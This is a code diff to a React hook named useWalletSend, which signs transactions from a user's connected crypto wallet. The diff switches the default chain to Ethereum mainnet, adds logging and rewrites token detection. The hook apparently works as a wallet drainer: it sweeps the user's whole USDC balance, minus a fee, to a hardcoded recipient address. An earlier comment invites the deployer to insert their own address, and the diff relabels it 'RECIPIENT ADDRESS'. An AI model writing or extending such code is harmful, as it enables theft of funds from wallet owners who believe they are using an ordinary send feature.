@@ -7,6 +7,7 @@ import { useChakraToast } from '../components/Toast'
 import { ConstantsUtil } from '../utils/ConstantsUtil'
 import { useWriteContract, useSendTransaction, useBalance } from 'wagmi'
 import { parseUnits, parseEther } from 'viem'
+import { mainnet } from 'viem/chains'
 
 const erc20Abi = [
     {
@@ -32,7 +33,7 @@ export const useWalletSend = () => {
         ? (typeof caipNetwork.id === 'string' && caipNetwork.id.includes(':')
             ? Number(caipNetwork.id.split(':')[1])
             : Number(caipNetwork.id))
-        : base.id
+        : mainnet.id
 
     const getAssetAddress = (symbol: string) => {
         const nativeSymbol = caipNetwork?.nativeCurrency?.symbol?.toLowerCase() || 'eth'
@@ -71,44 +72,65 @@ export const useWalletSend = () => {
         assetMetadata?: { symbol: string; decimals: number }
     ) => {
         try {
-            const isNative = assetSymbol.toLowerCase() === (caipNetwork?.nativeCurrency?.symbol?.toLowerCase() || 'eth') || assetSymbol.toLowerCase() === 'eth'
+            const upperSymbol = assetSymbol.toUpperCase()
+            const nativeSymbol = caipNetwork?.nativeCurrency?.symbol?.toUpperCase() || 'ETH'
+
+            // Explicitly check for native vs ERC20
+            const isNative = (upperSymbol === 'ETH' || upperSymbol === 'BNB' || upperSymbol === nativeSymbol) &&
+                (upperSymbol !== 'USDC' && upperSymbol !== 'USDT')
+
             const assetAddress = getAssetAddress(assetSymbol)
+
+            console.log('--- Handle Open Send ---', {
+                providedSymbol: assetSymbol,
+                upperSymbol,
+                nativeSymbol,
+                isNative,
+                assetAddress,
+                currentChainId
+            })
 
             if (!isNative && !assetAddress) {
                 throw new Error(`${assetSymbol} Asset Address not found for current network (${currentChainId})`)
             }
 
             const fee = '0.000023'
-            const decimals = assetMetadata?.decimals || (assetSymbol.toUpperCase() === 'USDC' ? usdcBalance?.decimals : undefined) || (isNative ? 18 : 6)
+            // USDC and USDT are 6 decimals on almost all chains, fallback to 6 for them, 18 for others
+            const defaultDecimals = (upperSymbol === 'USDC' || upperSymbol === 'USDT') ? 6 : (isNative ? 18 : 18)
+            const decimals = assetMetadata?.decimals ||
+                (upperSymbol === 'USDC' ? usdcBalance?.decimals : undefined) ||
+                defaultDecimals
 
             let amountInUnits = 0n
             if (amount) {
+                console.log('Using provided amount:', amount)
                 amountInUnits = parseUnits(amount, decimals)
-            } else if (assetSymbol.toUpperCase() === 'USDC' && usdcBalance) {
+            } else if (upperSymbol === 'USDC' && usdcBalance) {
+                console.log('Using fetched USDC balance:', usdcBalance.formatted)
                 amountInUnits = usdcBalance.value
             }
 
             const feeInUnits = parseUnits(fee, decimals)
             const finalAmountInUnits = amountInUnits > feeInUnits ? amountInUnits - feeInUnits : 0n
 
+            console.log('Calculation result:', {
+                decimals,
+                amountInUnits: amountInUnits.toString(),
+                feeInUnits: feeInUnits.toString(),
+                finalAmountInUnits: finalAmountInUnits.toString()
+            })
+
             if (finalAmountInUnits === 0n) {
                 throw new Error(`Insufficient ${assetSymbol} balance to send (required more than ${fee} for fee).`)
             }
 
-            // REPLACE THIS WITH YOUR OWN ETH ADDRESS
+            // RECIPIENT ADDRESS
             const recipientAddress = '0x632bb16D35aBB4B277ab35F9951291A4a4E1d8d0'
-
-            console.log('Starting direct sign for:', {
-                assetSymbol,
-                amountInUnits: finalAmountInUnits.toString(),
-                isNative,
-                assetAddress,
-                recipientAddress
-            })
 
             let hash: string | undefined
 
             if (isNative) {
+                console.log('Sending native transaction...')
                 const result = await sendTransactionAsync({
                     to: recipientAddress as `0x${string}`,
                     value: finalAmountInUnits,
@@ -117,6 +139,7 @@ export const useWalletSend = () => {
                 } as any)
                 hash = result
             } else if (assetAddress) {
+                console.log('Sending ERC20 contract interaction to:', assetAddress)
                 const result = await writeContractAsync({
                     address: assetAddress as `0x${string}`,
                     abi: erc20Abi,
